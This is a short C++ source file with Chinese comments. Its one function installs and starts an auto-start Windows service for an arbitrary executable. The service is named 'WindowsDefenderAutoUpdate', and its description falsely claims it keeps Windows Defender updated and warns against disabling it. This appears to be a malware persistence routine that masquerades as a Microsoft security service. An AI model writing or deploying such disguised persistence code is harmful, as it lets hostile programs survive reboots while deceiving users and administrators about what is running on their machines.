#include "SystemService.h"
#include <shlwapi.h>
#pragma comment(lib,"Shlwapi.lib")


BOOL RegisterSystemService(WCHAR lpszDriverPath[]) {

	BOOL bRet = TRUE;
	WCHAR pszServiceName[MAX_PATH] = L"WindowsDefenderAutoUpdate";
	WCHAR pszServiceDesc[MAX_PATH] = L"使你的Windows Defender保持最新状态。如果此服务已禁用或停止，则Windows Defender将无法保持最新状态，这意味这无法修复可能产生的安全漏洞，并且功能也可能无法使用。";

	// 为路径加上引号，因为CreateService中的lpBinaryPathName要求带引号，除非路径中没空格
	WCHAR lpBinaryPathName[MAX_PATH + 2];
	wsprintf(lpBinaryPathName, L"\"%s\"", lpszDriverPath);

	SC_HANDLE shOSCM = NULL, shCS = NULL;
	SERVICE_STATUS ss;
	DWORD dwErrorCode = 0;
	BOOL bSuccess = FALSE;
	// 打开服务控制管理器数据库
	shOSCM = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!shOSCM)
	{
		MessageBox(0, L"OpenSCManager", L"", 0);
		return FALSE;
	}

	// 创建服务
	// SERVICE_AUTO_START   随系统自动启动
	// SERVICE_DEMAND_START 手动启动
	shCS = ::CreateService(shOSCM, pszServiceName, pszServiceDesc,
		SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
		SERVICE_AUTO_START,
		SERVICE_ERROR_NORMAL,
		lpBinaryPathName, NULL, NULL, NULL, NULL, NULL);
	if (!shCS)
	{
		MessageBox(0, L"CreateService Failed", L"", 0);
		DWORD d = GetLastError();
		return FALSE;
	}

	// 启动服务
	if (!::StartService(shCS, 0, NULL))
	{
		MessageBox(0, L"StartService Failed", L"", 0);
		return FALSE;
	}

	// 关闭句柄
	if (shCS)
	{
		::CloseServiceHandle(shCS);
		shCS = NULL;
	}
	if (shOSCM)
	{
		::CloseServiceHandle(shOSCM);
		shOSCM = NULL;
	}

	return bRet;
}